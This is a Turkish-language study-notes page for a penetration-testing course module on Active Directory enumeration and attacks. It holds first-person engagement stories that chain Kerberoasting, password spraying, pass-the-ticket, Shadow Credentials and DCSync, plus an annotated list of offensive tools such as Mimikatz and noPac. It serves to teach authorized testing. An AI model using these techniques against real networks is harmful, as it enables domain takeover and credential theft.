---
{"dg-publish":true,"permalink":"/active-directory/active-directory-attacks-and-enumaration/"}
---


### Active Directory Açıklaması

Active Directory (AD), Windows kurumsal ortamları için 2000 yılında Windows Server 2000'in piyasaya sürülmesiyle resmi olarak uygulamaya konulan ve o zamandan bu yana her bir sonraki sunucu işletim sisteminin piyasaya sürülmesiyle aşamalı olarak geliştirilen bir dizin hizmetidir. AD, kendisinden önce gelen x.500 ve LDAP protokollerine dayanmaktadır ve bugün hala bu protokolleri bir şekilde kullanmaktadır. Kullanıcılar, bilgisayarlar, gruplar, ağ cihazları ve dosya paylaşımları, Grup politikaları, cihazlar ve güvenler dahil olmak üzere bir kuruluşun kaynaklarının merkezi olarak yönetilmesine olanak tanıyan dağıtılmış, hiyerarşik bir yapıdır. AD, bir Windows kurumsal ortamında kimlik doğrulama, muhasebe ve yetkilendirme işlevleri sağlar. 


### Reklamı Neden Önemsemeliyiz?
Bu modülün yazıldığı sırada Microsoft Active Directory, Kimlik ve Erişim yönetimi çözümlerini kullanan kurumsal kuruluşlar için pazar payının yaklaşık %43'ünü elinde tutmaktadır. Bu, pazarın büyük bir kısmıdır ve Microsoft Azure AD ile uygulamaları geliştirip harmanladığı için yakın zamanda herhangi bir yere gitmesi muhtemel değildir. Dikkate alınması gereken bir başka ilginç istatistik de, sadece son iki yılda Microsoft'un bir CVE'ye bağlı 2000'den fazla güvenlik açığı bildirmiş olmasıdır. AD'nin birçok hizmeti ve temel amacı olan bilginin kolay bulunması ve erişilmesi, AD'yi yönetilmesi ve doğru şekilde sağlamlaştırılması gereken bir dev haline getirmektedir. Bu durum, işletmeleri hizmetlerin ve izinlerin basit yanlış yapılandırmalarından kaynaklanan güvenlik açıklarına ve istismara maruz bırakmaktadır. Bu yanlış yapılandırmaları ve erişim kolaylığını yaygın kullanıcı ve işletim sistemi açıklarıyla birleştirdiğinizde, bir saldırganın yararlanabileceği mükemmel bir fırtınaya sahip olursunuz. Tüm bunları akılda tutarak, bu modül bu yaygın sorunlardan bazılarını inceleyecek ve bize bunların nasıl tanımlanacağını, numaralandırılacağını ve varlıklarından nasıl yararlanılacağını gösterecektir. Sysinternals, WMI, DNS ve diğerleri gibi yerel araçları ve dilleri kullanarak AD'yi numaralandırma alıştırması yapacağız. Ayrıca uygulayacağımız bazı saldırılar arasında Password spraying, Kerberoasting, Responder, Kerbrute, Bloodhound gibi araçların kullanımı ve çok daha fazlası yer almaktadır.

Kendimizi genellikle, savunmasız bir uygulama veya hizmet gibi bir remote exploit aracılığıyla bir dayanak noktasına giden net bir yolu olmayan bir ağda bulabiliriz. Yine de, birçok şekilde bir dayanak noktası oluşturabilecek bir Active Directory ortamındayız. Bir müşterinin AD ortamında bir yer edinmenin genel amacı, değerlendirmenin amacına ulaşana kadar ağ boyunca yanal veya dikey olarak hareket ederek ayrıcalıkları yükseltmektir. Amaç müşteriden müşteriye değişebilir. Belirli bir host'a, kullanıcının e-posta gelen kutusuna, veri tabanına erişmek ya da domain'i tamamen ele geçirmek ve test süresi içinde Domain Admin seviyesine erişmek için mümkün olan her yolu aramak olabilir. Active Directory'yi numaralandırmayı ve saldırmayı kolaylaştırmak için birçok açık kaynaklı araç mevcuttur. En etkili olmak için, bu numaralandırmanın mümkün olduğunca çoğunu manuel olarak nasıl gerçekleştireceğimizi anlamalıyız. Daha da önemlisi, belirli kusurların ve yanlış yapılandırmaların arkasındaki “nedeni” anlamamız gerekir. Bu bizi saldırganlar olarak daha etkili kılacak ve müşterilerimize ortamlarındaki önemli sorunlar hakkında sağlam tavsiyelerin yanı sıra net ve eyleme geçirilebilir düzeltme tavsiyeleri vermemizi sağlayacaktır.

“Arazide yaşamak” olarak da bilinen sınırlı bir araç seti veya yerleşik Windows araçlarıyla hem Windows hem de Linux'tan AD'yi numaralandırma ve saldırma konusunda rahat olmamız gerekir. Araçlarımızın başarısız olduğu, engellendiği veya müşterinin alıştığımız özelleştirilmiş Linux veya Windows saldırı hostu yerine yönetilen bir workstation veya VDI örneğinden çalışmamızı istediği bir değerlendirme yürüttüğümüz durumlarla karşılaşmak yaygındır. Tüm durumlarda etkili olabilmek için, anında hızlı bir şekilde adapte olabilmeli, AD'nin birçok farklılığını anlamalı ve seçeneklerimiz ciddi şekilde sınırlı olsa bile bunlara nasıl erişeceğimizi bilmeliyiz.


## Real-World Examples
Gerçek dünyadaki AD merkezli bir etkileşimde nelerin mümkün olduğunu görmek için birkaç senaryoya bakalım:

Senaryo 1 - Bir Yönetici Bekleniyor

Bu görev sırasında, tek bir hostun güvenliğini tehlikeye attım ve SYSTEM düzeyinde erişim elde ettim. Bu, domain'e bağlı bir host olduğu için, bu erişimi domain'i numaralandırmak için kullanabildim. Tüm standart numaralandırma işlemlerini yaptım ancak pek bir şey bulamadım. Ortamda Service Principal Names (SPN'ler) vardı ve Kerberoasting saldırısı gerçekleştirip birkaç hesap için TGS bileti alabildim. Bunları Hashcat ve bazı standart kelime listelerim ve kurallarımla kırmaya çalıştım, ancak ilk başta başarısız oldum. Sonunda, Hashcat ile birlikte gelen [d3ad0ne](https://github.com/hashcat/hashcat/blob/master/rules/d3ad0ne.rule) kuralı ile birlikte çok büyük bir kelime listesiyle gece boyunca çalışan bir kırma işi bıraktım. Ertesi sabah bir bilete ulaştım ve bir kullanıcı hesabının açık metin şifresini elde ettim. Bu hesap bana önemli bir erişim sağlamıyordu, ancak belirli dosya paylaşımlarına yazma erişimi sağlıyordu. Bu erişimi SCF dosyalarını paylaşımların etrafına bırakmak için kullandım ve Responder'ı çalışır durumda bıraktım. Bir süre sonra, bir kullanıcının NetNTLMv2 hash'i olan tek bir hit aldım. BloodHound çıktısını kontrol ettim ve bu kullanıcının aslında bir domain yöneticisi olduğunu fark ettim! Bundan sonrası kolaydı.


Senaryo 2 - Geceyi Püskürtmek

Password spraying, bir domain'de yer edinmek için son derece etkili bir yol olabilir, ancak bu süreçte kullanıcı hesaplarını kilitlememek için büyük özen göstermeliyiz. Bir etkileşimde, [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) aracını kullanarak bir SMB NULL oturumu buldum ve hem domain'deki tüm kullanıcıların bir listesini hem de domain parola politikasını aldım. Parola politikasını bilmek çok önemliydi çünkü herhangi bir hesabı kilitlememek için parametreler dahilinde kaldığımdan emin olabilirdim ve ayrıca politikanın en az sekiz karakterli bir parola olduğunu ve parola karmaşıklığının zorunlu olduğunu biliyordum (yani bir kullanıcının parolasının 3/4 özel karakter, sayı, büyük harf veya küçük harf sayısı, yani Welcome1 olması gerekiyordu). Welcome1, Password1, Password123, Spring2018, vb. gibi birkaç yaygın zayıf parola denedim ancak herhangi bir isabet alamadım. Sonunda, Spring@18 ile bir deneme yaptım ve isabet aldım! Bu hesabı kullanarak BloodHound'u çalıştırdım ve bu kullanıcının yerel yönetici erişimine sahip olduğu birkaç host buldum. Bu hostlardan birinde bir domain admin hesabının aktif bir oturumu olduğunu fark ettim. Rubeus aracını kullanarak bu domain kullanıcısı için Kerberos TGT biletini çıkartabildim. Oradan, bir pass-the-ticket saldırısı gerçekleştirebildim ve bu domain admin kullanıcısı olarak kimlik doğrulaması yapabildim. Bonus olarak, devraldığım domainin Domain Administrators grubu, iç içe grup üyeliği yoluyla güvenen domaindeki Administrators grubunun bir parçası olduğu için güvenen domaini de devralabildim, yani diğer domainde tam yönetim seviyesi erişimle kimlik doğrulaması yapmak için aynı kimlik bilgileri kümesini kullanabilirdim.


Senaryo 3 - Karanlıkta Savaşmak

Bu üçüncü etkileşimde bir yer edinmek için tüm standart yöntemlerimi denemiştim ama hiçbiri işe yaramamıştı. Geçerli kullanıcı adlarını listelemek için Kerbrute aracını kullanmaya ve ardından, eğer bulursam, parola politikasını bilmediğim ve herhangi bir hesabı kilitlemek istemediğim için hedefli bir parola püskürtme saldırısı yapmaya karar verdim. İlk olarak şirketin LinkedIn sayfasındaki potansiyel kullanıcı adlarını bir araya getirmek için linkedin2username aracını kullandım. Bu listeyi istatistiksel olarak olası kullanıcı adları GitHub deposundaki birkaç kullanıcı adı listesiyle birleştirdim ve Kerbrute'un userenum özelliğini kullandıktan sonra 516 geçerli kullanıcıya ulaştım. Parola püskürtme konusunda dikkatli davranmam gerektiğini biliyordum, bu yüzden Welcome2021 parolasıyla denedim ve tek bir isabet aldım! Bu hesabı kullanarak BloodHound'un Python sürümünü saldırı hostumdan çalıştırdım ve tüm domain kullanıcılarının tek bir kutuya RDP erişimi olduğunu gördüm. Bu hostta oturum açtım ve tekrar püskürtmek için PowerShell aracı DomainPasswordSpray'i kullandım. Bu sefer kendimden daha emindim çünkü a) parola ilkesini görüntüleyebiliyordum ve b) DomainPasswordSpray aracı kilitlenmeye yakın hesapları hedef listesinden kaldıracaktı. Domain içinde kimliğim doğrulandığı için artık tüm domain kullanıcılarına püskürtme yapabiliyordum, bu da bana çok daha fazla hedef veriyordu. Ortak parola Fall2021 ile tekrar denedim ve hepsi ilk kelime listemde olmayan kullanıcılar için birkaç isabet aldım. Bu hesapların her birinin haklarını kontrol ettim ve birinin Enterprise Key Admins grubu üzerinde GenericAll haklarına sahip olan Help Desk grubunda olduğunu gördüm. Enterprise Key Admins grubunun bir domain controller üzerinde GenericAll ayrıcalıkları vardı, bu yüzden kontrol ettiğim hesabı bu gruba ekledim, tekrar kimlik doğrulaması yaptım ve bu ayrıcalıkları devraldım. Bu hakları kullanarak Shadow Credentials saldırısını gerçekleştirdim ve domain controller makine hesabının NT hash'ini aldım. Bu NT hash'i ile daha sonra bir DCSync saldırısı gerçekleştirebildim ve domain'deki tüm kullanıcılar için NTLM parola hash'lerini alabildim çünkü bir domain controller DCSync için gerekli olan replikasyonu gerçekleştirebilir.


### İşte Bu Yol
Bu senaryolar şu anda birçok yabancı kavramla dolu görünebilir, ancak bu modülü tamamladıktan sonra çoğuna aşina olacaksınız (bu senaryolarda açıklanan bazı kavramlar bu modülün kapsamı dışındadır). Bunlar, yinelemeli numaralandırmanın, hedefimizi anlamanın ve bir ortamda ilerlerken uyum sağlamanın ve kutunun dışında düşünmenin önemini göstermektedir. Bu modül bölümlerinde yukarıda açıklanan saldırı zincirlerinin birçok parçasını gerçekleştireceğiz ve ardından bu modülün sonunda iki farklı AD ortamına saldırarak ve kendi saldırı zincirlerinizi keşfederek becerilerinizi test edeceksiniz. Sıkı tutunun çünkü bu, Active Directory'yi numaralandırmak ve saldırmak olan vahşi dünyada eğlenceli ama inişli çıkışlı bir yolculuk olacak.

Pratik Örnekler
Modül boyunca, eşlik eden komut çıktılarıyla birlikte örnekleri ele alacağız. Bunların çoğu, ilgili bölümlerde ortaya çıkarılabilecek hedef VM'lerde yeniden üretilebilir. Bir Windows hostundan (MS01) nasıl numaralandırma ve saldırı yapılacağını öğrenmek için bazı hedef VM'lerle etkileşim kurmanız için RDP kimlik bilgileri ve Linux'tan numaralandırma ve saldırı örnekleri gerçekleştirmek için önceden yapılandırılmış bir Parrot Linux hostuna (ATTACK01) SSH erişimi sağlanacaktır. Pwnbox'tan veya kendi sanal makinenizden (bir makine ortaya çıktığında bir VPN anahtarı indirdikten sonra) FreeRDP, Remmina veya uygun olduğunda seçtiğiniz RDP istemcisini veya Pwnbox'ta veya kendi sanal makinenizde yerleşik SSH istemcisini kullanarak RDP aracılığıyla bağlanabilirsiniz.


### FreeRDP aracılığıyla bağlanma
Komutu kullanarak komut satırı üzerinden bağlanabiliriz:
![Pasted image 20241001231134.png](/img/user/resimler/Pasted%20image%2020241001231134.png)

### SSH üzerinden bağlanma
Komutunu kullanarak sağlanan Parrot Linux saldırı hostuna bağlanabiliriz, ardından istendiğinde sağlanan şifreyi girebiliriz.
![Pasted image 20241001231222.png](/img/user/resimler/Pasted%20image%2020241001231222.png)


### Xfreerdp'den ATTACK01 Parrot Host'a
Ayrıca Parrot saldırı hostuna GUI erişimi sağlamak için ATTACK01 hostuna bir XRDP sunucusu kurduk. Bu, bu bölümde daha sonra ele alacağımız BloodHound GUI aracıyla etkileşim kurmak için kullanılabilir. Bu hostun ortaya çıktığı bölümlerde (size SSH erişiminin verildiği yerlerde), yukarıdaki Windows saldırı hostu ile aynı komutu kullanarak xfreerdp kullanarak da bağlanabilirsiniz:
![Pasted image 20241001231310.png](/img/user/resimler/Pasted%20image%2020241001231310.png)
Çoğu bölüm MS01 veya ATTACK01 üzerinde htb-student kullanıcısı için kimlik bilgileri sağlayacaktır. Materyale ve zorluklara bağlı olarak, bazı bölümlerde farklı bir kullanıcıyla bir hedefe kimlik doğrulaması yapmanız gerekecek ve alternatif kimlik bilgileri sağlanacaktır.


### Toolkit
Bu modül için eşlik eden laboratuvarda bir Windows ve Parrot Linux saldırı hostu sağlamaktayız. Modül bölümleri boyunca tüm örnekleri gerçekleştirmek ve tüm soruları çözmek için gereken tüm araçlar hostlarda mevcuttur. Windows saldırı hostu MS01 için gerekli araçlar C:\Tools dizininde bulunmaktadır. Active Directory PowerShell modülü gibi diğerleri, bir PowerShell konsol penceresi açıldığında yüklenecektir. Linux saldırı hostu ATTACK01'deki araçlar ya yüklenir ve htb-student kullanıcılarının PATH'ine eklenir ya da /opt dizininde bulunur. Elbette, (gerektiğinde) kendi araçlarınızı ve komut dosyalarınızı derleyebilir ve bunu yapma alışkanlığı kazanmak için saldırı hostlarına yükleyebilir veya bu şekilde araçlarla çalışan Pwnbox'tan bir SMB paylaşımında barındırabilirsiniz (ve bu teşvik edilir). Bir müşterinin ağında gerçek bir sızma testi gerçekleştirirken, kodu önceden incelemek ve derlenmiş yürütülebilir dosyada kötü niyetli hiçbir şeyin saklanmadığından emin olmak için araçları kendinizin derlemesinin her zaman en iyisi olduğunu unutmayın. Virüslü araçları bir müşterinin ağına sokmak ve onları dışarıdan gelecek bir saldırıya maruz bırakmak istemeyiz.

İyi eğlenceler ve kutunun dışında düşünmeyi unutmayın! AD muazzamdır. Bir gecede ustalaşmayacaksınız, ancak üzerinde çalışmaya devam edin ve yakında bu modüldeki içerik ikinci doğa olacak.


### Tools of the Trade
Modül bölümlerinin çoğu açık kaynaklı komut dosyaları veya önceden derlenmiş binaryler gibi araçlar gerektirir. Bunlar, Windows'tan saldırmayı amaçlayan bölümlerde sağlanan Windows hostlarında C:\Tools dizininde bulunabilir. AD'ye Linux'tan saldırmaya odaklanan bölümlerde, iç ağda bir saldırı hostu olan anonim bir kullanıcıymışsınız gibi hedef ortam için özelleştirilmiş bir Parrot Linux hostu sağlıyoruz. Gerekli tüm araçlar ve komut dosyaları bu host'a önceden yüklenmiştir (ya yüklüdür ya da /opt dizinindedir). Bu modülde ele alacağımız araçların birçoğunun listesi aşağıda verilmiştir:

[PowerView](https://github.com/dmchell/SharpView)/[SharpView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) : AD'de durumsal farkındalık kazanmak için kullanılan bir PowerShell aracı ve aynı aracın .NET portu. Bu araçlar çeşitli Windows net* komutları ve daha fazlası için yedek olarak kullanılabilir. PowerView ve SharpView, BloodHound'un yaptığı verilerin çoğunu toplamamıza yardımcı olabilir, ancak tüm veri noktaları arasında anlamlı ilişkiler kurmak için daha fazla çalışma gerektirir. Bu araçlar, yeni bir kimlik bilgisi setiyle ne gibi ek erişimlere sahip olabileceğimizi kontrol etmek, belirli kullanıcıları veya bilgisayarları hedeflemek ya da Kerberoasting veya ASREPRoasting yoluyla saldırılabilecek kullanıcılar gibi bazı “hızlı kazançlar” bulmak için harikadır.

[BloodHound](https://github.com/BloodHoundAD/BloodHound) : AD ilişkilerini görsel olarak haritalamak ve aksi takdirde fark edilmeyebilecek saldırı yollarını planlamaya yardımcı olmak için kullanılır. Daha sonra AD ortamının grafiksel analizi için bir [Neo4j](https://neo4j.com/) veritabanı ile BloodHound JavaScript (Electron) uygulamasına aktarılacak verileri toplamak için [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) PowerShell veya C# ingestor kullanır.

[SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) : Active Directory'den kullanıcılar, gruplar, bilgisayarlar, ACL'ler, GPO'lar, kullanıcı ve bilgisayar öznitelikleri, kullanıcı oturumları ve daha fazlası gibi çeşitli AD nesneleri hakkında bilgi toplamak için C# veri toplayıcısı. Araç, daha sonra analiz için BloodHound GUI aracına alınabilen JSON dosyaları üretir.

[BloodHound.py](https://github.com/dirkjanm/BloodHound.py) : [Impacket](https://github.com/fortra/impacket) araç setine dayanan Python tabanlı bir BloodHound ingestor. Çoğu BloodHound toplama yöntemini destekler ve domain'e bağlı olmayan bir saldırı hostundan çalıştırılabilir. Çıktı, analiz için BloodHound GUI'ye alınabilir.

[Kerbrute](https://github.com/ropnop/kerbrute) : Active Directory hesaplarını numaralandırmak, password spraying ve brute-forcing yapmak için Kerberos Pre-Authentication kullanan Go ile yazılmış bir araç.

[Impacket toolkit](https://github.com/fortra/impacket) : Ağ protokolleriyle etkileşim için Python'da yazılmış bir araç koleksiyonu. Araç paketi, Active Directory'yi numaralandırmak ve saldırmak için çeşitli komut dosyaları içerir.

[Responder](https://github.com/lgandx/Responder) : Responder, LLMNR, NBT-NS ve MDNS'yi birçok farklı işlevle zehirlemek için özel olarak tasarlanmış bir araçtır.

[Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) : Responder'a benzer şekilde, çeşitli ağ sahtekarlığı ve zehirleme saldırıları gerçekleştirmek için bir PowerShell aracı.

[C# Inveigh (InveighZero) ](https://github.com/Kevin-Robertson/Inveigh/tree/master/Inveigh): Inveigh'in kullanıcı adı ve parola hash'leri gibi yakalanan verilerle etkileşim için yarı etkileşimli bir konsola sahip C# sürümü.

[rpcinfo](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rpcinfo) : rpcinfo yardımcı programı, bir RPC programının durumunu sorgulamak veya uzak bir hosttaki mevcut RPC servislerinin listesini listelemek için kullanılır. “-p” seçeneği hedef hostu belirtmek için kullanılır. Örneğin “rpcinfo -p 10.0.0.1” komutu, uzak hostta bulunan tüm RPC servislerinin bir listesini, program numarası, sürüm numarası ve protokolü ile birlikte döndürür. Bu komutun yeterli ayrıcalıklarla çalıştırılması gerektiğini unutmayın.

[rpcclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html) : Remote RPC servisi aracılığıyla çeşitli Active Directory numaralandırma görevlerini gerçekleştirmek için kullanılabilen Linux dağıtımlarında Samba paketinin bir parçası.

[CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec) : CME, topladığımız verilerle numaralandırma ve saldırı gerçekleştirmede bize büyük ölçüde yardımcı olabilecek bir numaralandırma, saldırı ve sömürü sonrası araç setidir. CME, “arazide yaşamaya” ve SMB, WMI, WinRM ve MSSQL gibi yerleşik AD özelliklerini ve protokollerini kötüye kullanmaya çalışır.

[Rubeus](https://github.com/GhostPack/Rubeus) : Rubeus, Kerberos İstismarı için oluşturulmuş bir C # aracıdır.

[GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py) : Normal kullanıcılara bağlı Service Principal adlarını bulmaya yönelik başka bir Impacket modülü.

[Hashcat](https://hashcat.net/hashcat/) : Harika bir hash kırma ve şifre kurtarma aracı.

[enum4linux](https://github.com/CiscoCXSecurity/enum4linux) : Windows ve Samba sistemlerinden bilgi numaralandırmak için bir araç.

[enum4linux-ng ](https://github.com/cddmp/enum4linux-ng): Orijinal Enum4linux aracının biraz farklı çalışan bir yeniden çalışması.

[ldapsearch](https://linux.die.net/man/1/ldapsearch) : LDAP protokolü ile etkileşim için yerleşik arayüz.

[windapsearch](https://github.com/ropnop/windapsearch) : LDAP sorgularını kullanarak AD kullanıcılarını, gruplarını ve bilgisayarlarını numaralandırmak için kullanılan bir Python betiği. Özel LDAP sorgularını otomatikleştirmek için kullanışlıdır.

[DomainPasswordSpray.ps1](https://github.com/dafthack/DomainPasswordSpray) : DomainPasswordSpray, bir domainin kullanıcılarına karşı parola püskürtme saldırısı gerçekleştirmek için PowerShell'de yazılmış bir araçtır.

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) : Araç seti, Microsoft'un Local Administrator Password Solution'ını (LAPS) dağıtan Active Directory ortamlarını denetlemek ve bunlara saldırmak için PowerView'den yararlanan PowerShell'de yazılmış işlevleri içerir.

[smbmap](https://github.com/ShawnDEvans/smbmap) : Bir domain boyunca SMB paylaşım numaralandırması.

[psexec.py ](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py): Impacket araç setinin bir parçası, bize yarı etkileşimli bir shell şeklinde Psexec benzeri işlevsellik sağlar.

[wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) : Impacket araç setinin bir parçasıdır, WMI üzerinden komut yürütme yeteneği sağlar.

[Snaffler](https://github.com/SnaffCon/Snaffler) : Erişilebilir dosya paylaşımlarına sahip bilgisayarlarda Active Directory'de bilgi (kimlik bilgileri gibi) bulmak için kullanışlıdır.

[smbserver.py ](https://github.com/fortra/impacket/blob/master/examples/smbserver.py): Windows hosts ile etkileşim için basit SMB sunucu yürütme. Bir ağ içinde dosya aktarmanın kolay yolu.

[setspn.exe](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) : Bir Active Directory servis hesabı için Service Principal Names (SPN) dizin özelliğini ekler, okur, değiştirir ve siler.

[Mimikatz](https://github.com/ParrotSec/mimikatz) : Birçok fonksiyonu yerine getirir. Özellikle, pass-the-hash saldırıları, düz metin şifreleri çıkarma ve bir host üzerindeki bellekten Kerberos bileti çıkarma.

[secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) : Bir hosttan SAM ve LSA gizli bilgilerini uzaktan dökme.

[evil-winrm ](https://github.com/Hackplayers/evil-winrm): WinRM protokolü üzerinden bir host üzerinde etkileşimli bir shell sağlar.

[mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) : Impacket araç setinin bir parçasıdır, MSSQL veritabanları ile etkileşim yeteneği sağlar.

[noPac.py ](https://github.com/Ridter/noPac): Standart domain kullanıcısından DA kimliğine bürünmek için CVE-2021-42278 ve CVE-2021-42287'yi kullanan Exploit combo.

[rpcdump.py](https://github.com/fortra/impacket/blob/master/examples/rpcdump.py) : Impacket araç setinin bir parçası, RPC endpoint mapper.

[CVE-2021-1675.py](https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py) : Python'da Printnightmare PoC.

[ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) : Impacket araç setinin bir parçasıdır, SMB relay saldırıları gerçekleştirir.

[PetitPotam.py](https://github.com/topotam/PetitPotam) : Windows hostlarını MS-EFSRPC EfsRpcOpenFileRaw veya diğer fonksiyonlar aracılığıyla diğer makinelere kimlik doğrulaması yapmaya zorlamak için CVE-2021-36942 için PoC aracı.

[gettgtpkinit.py ](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py): Sertifikaları ve TGT'leri manipüle etmek için araç.

[getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) : Bu araç, U2U kullanarak mevcut kullanıcı için bir PAC istemek için mevcut bir TGT kullanacaktır.

[adidnsdump](https://github.com/dirkjanm/adidnsdump) : Bir domain'den DNS kayıtlarını numaralandırmak ve dökmek için bir araç. DNS Zone aktarımı yapmaya benzer.

[gpp-decrypt](https://github.com/t0thkr1s/gpp-decrypt) : Group Policy tercih dosyalarından kullanıcı adlarını ve parolaları çıkarır.

[GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) : Impacket araç setinin bir parçası. 'Kerberos ön kimlik doğrulaması gerektirme' ayarına sahip kullanıcılar için AS-REP hash'lerini listelemek ve elde etmek için ASREPRoasting saldırısını gerçekleştirmek için kullanılır. Bu hash'ler daha sonra çevrimdışı şifre kırma denemeleri için Hashcat gibi bir araca beslenir.

[lookupsid.py](https://github.com/fortra/impacket/blob/master/examples/lookupsid.py) : SID bruteforcing aracı.

[ticketer.py](https://github.com/fortra/impacket/blob/master/examples/ticketer.py) : TGT/TGS biletlerinin oluşturulması ve özelleştirilmesi için bir araç. Golden Ticket oluşturma, child to parent trust saldırıları vb. için kullanılabilir.

[raiseChild.py](https://github.com/fortra/impacket/blob/master/examples/raiseChild.py) : Impacket araç setinin bir parçasıdır, otomatik child to parent domain ayrıcalık yükseltme aracıdır

[Active Directory Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer) : Active Directory Explorer (AD Explorer) bir AD görüntüleyicisi ve düzenleyicisidir. Bir AD veritabanında gezinmek ve nesne özelliklerini ve özniteliklerini görüntülemek için kullanılabilir. Çevrimdışı analiz için bir AD veritabanının anlık görüntüsünü kaydetmek için de kullanılabilir. Bir AD anlık görüntüsü yüklendiğinde, veritabanının canlı bir sürümü olarak keşfedilebilir. Nesneler, öznitelikler ve güvenlik izinlerindeki değişiklikleri görmek için iki AD veritabanı anlık görüntüsünü karşılaştırmak için de kullanılabilir.

[PingCastle](https://www.pingcastle.com/documentation/) : Bir risk değerlendirmesi ve olgunluk çerçevesine (AD güvenliğine uyarlanmış CMMI'ye dayalı) dayalı olarak bir AD ortamının güvenlik düzeyini denetlemek için kullanılır.

[Group3r](https://github.com/Group3r/Group3r) : Group3r, AD Group Policy Objects'de (GPO) güvenlik yanlış yapılandırmalarını denetlemek ve bulmak için kullanışlıdır.

[ADRecon](https://github.com/adrecon/ADRecon) : Hedef AD ortamından çeşitli verileri ayıklamak için kullanılan bir araçtır. Veriler, analize yardımcı olmak ve ortamın genel güvenlik durumunun bir resmini çizmek için özet görünümler ve analizlerle Microsoft Excel biçiminde çıkarılabilir.


### Senaryo
CAT-5 Security için çalışan Sızma Testçileriyiz. Ekipte birkaç başarılı görev aldıktan sonra, daha kıdemli üyeler kendi başımıza bir değerlendirme başlatarak ne kadar iyi yapabileceğimizi görmek istiyorlar. Ekip lideri bize başarmamız gerekenleri detaylandıran aşağıdaki e-postayı gönderdi.

#### Tasking Email
![Pasted image 20241001234442.png](/img/user/resimler/Pasted%20image%2020241001234442.png)

Bu modül, bu görevlerle becerilerimizi (hem önceki hem de yeni basılmış) uygulamamıza olanak tanıyacaktır. Bu modül için son değerlendirme, Inlanefreight şirketine karşı iki dahili sızma testinin yürütülmesidir. Bu değerlendirmeler sırasında, dışarıdan bir ihlal konumundan başlayarak simüle edilen bir iç sızma testi ve müşterilerin sıklıkla talep ettiği gibi dahili ağ içindeki bir saldırı kutusuyla başlayan ikinci bir test üzerinde çalışacağız. Beceri değerlendirmelerinin tamamlanması, kapsam belirleme belgesinde ve yukarıdaki görevlendirme e-postasında belirtilen görevlerin başarıyla tamamlanması anlamına gelmektedir. Bunu yaparken, birçok otomatik ve manuel AD saldırısı ve numaralandırma kavramını sağlam bir şekilde kavradığımızı, çok çeşitli araçlar hakkında bilgi ve deneyim sahibi olduğumuzu ve değerlendirmeyi ilerletmek için kritik kararlar almak üzere bir AD ortamından toplanan verileri yorumlama becerisine sahip olduğumuzu göstereceğiz. Bu modüldeki içerik, Active Directory ortamlarında dahili sızma testleri gerçekleştirmede başarılı olmak isteyen herkes için gerekli olan temel numaralandırma kavramlarını kapsamayı amaçlamaktadır. Ayrıca, daha gelişmiş modüllerde ele alınacak AD odaklı materyal için bir astar olarak bazı daha gelişmiş kavramlar üzerinde çalışırken en yaygın saldırı tekniklerinin çoğunu derinlemesine ele alacağız.

Aşağıda, müşteri tarafından sağlanan tüm ilgili bilgileri içeren görev için tamamlanmış bir kapsam belgesi bulacaksınız.

### Değerlendirme Kapsamı
Aşağıda tanımlanan IP'ler, ana bilgisayarlar ve domainler değerlendirmenin kapsamını oluşturmaktadır.

### Değerlendirme Kapsamında
![Pasted image 20241001234838.png](/img/user/resimler/Pasted%20image%2020241001234838.png)

### Kapsam Dışı
* INLANEFREIGHT.LOCAL'ın diğer tüm alt domainleri
* FREIGHTLOGISTICS.LOCAL'ın tüm alt domainleri
* Kimlik avı veya sosyal mühendislik saldırıları
* Açıkça belirtilmeyen diğer tüm IPS/alan/alt alan adları
* Bu modülde gösterilen pasif numaralandırma dışında gerçek dünyadaki inlanefreight.com web sitesine yönelik her türlü saldırı

### Kullanılan Yöntemler
Inlanefreight ve sistemlerinin değerlendirilmesi için aşağıdaki yöntemler yetkilendirilmiştir:


### Dışarıdan Bilgi Toplama (Pasif Kontroller)
Harici bilgi toplama, şirket hakkında internetten toplanabilecek bilgilerle ilişkili riskleri göstermek için yetkilendirilmiştir. Gerçek dünyadaki bir saldırıyı simüle etmek için CAT-5 ve değerlendiricileri, bu belgede sağlananlar dışında Inlanefreight hakkında önceden hiçbir bilgi verilmeden internette anonim bir bakış açısıyla harici bilgi toplama işlemi gerçekleştirecektir.

Cat-5, iç testlere yardımcı olabilecek bilgileri ortaya çıkarmak için pasif numaralandırma gerçekleştirecektir. Test, Inlanefreight için risk oluşturabilecek ve iç sızma testine yardımcı olabilecek halka açık verileri belirlemek için açık kaynak kodlu kaynaklardan çeşitli derecelerde bilgi toplama yöntemini kullanacaktır. İnternete dönük “gerçek dünya” IP adreslerine veya https://www.inlanefreight.com adresinde bulunan web sitesine karşı hiçbir aktif numaralandırma, port taraması veya saldırı gerçekleştirilmeyecektir.


### İç Testler
İç değerlendirme bölümü, Inlanefreight'ın faaliyet alanından saldırı vektörlerini taklit etmeye çalışarak dahili hostlar ve hizmetlerdeki (özellikle Active Directory) güvenlik açıklarıyla ilişkili riskleri göstermek için tasarlanmıştır. Sonuç, Inlanefreight'ın dahili güvenlik açıklarının risklerini ve başarılı bir şekilde istismar edilen bir güvenlik açığının potansiyel etkisini değerlendirmesine olanak tanıyacaktır.

